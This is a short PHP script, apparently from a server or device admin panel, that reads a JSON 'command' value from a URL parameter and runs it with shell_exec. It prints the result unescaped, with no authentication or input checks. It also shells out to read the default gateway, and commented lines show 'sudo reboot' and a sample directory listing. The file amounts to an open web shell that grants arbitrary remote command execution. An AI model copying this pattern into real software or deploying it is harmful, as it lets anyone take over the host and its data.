<?php
include('mx_function.php');
$data_txt = isset($_GET['dataE']) ? $_GET['dataE']:"";
$data_arr = json_decode($data_txt,true);

$gateway = trim(shell_exec("ip route | awk '/default/ && /eth0/ {print \$3}'"));
echo "gateway: $gateway\n";

// echo $data_arr['command'];
// shell_exec('sudo reboot');
// shell_exec('sudo /sbin/reboot');

// $data_arr["command"] = "ls -la /var/www";
$output = shell_exec($data_arr["command"]);
echo "<pre>$output</pre>";

// shell_exec($data_arr["command"]);
// shell_exec('sudo reboot');
// echo $data_arr['command'];


?>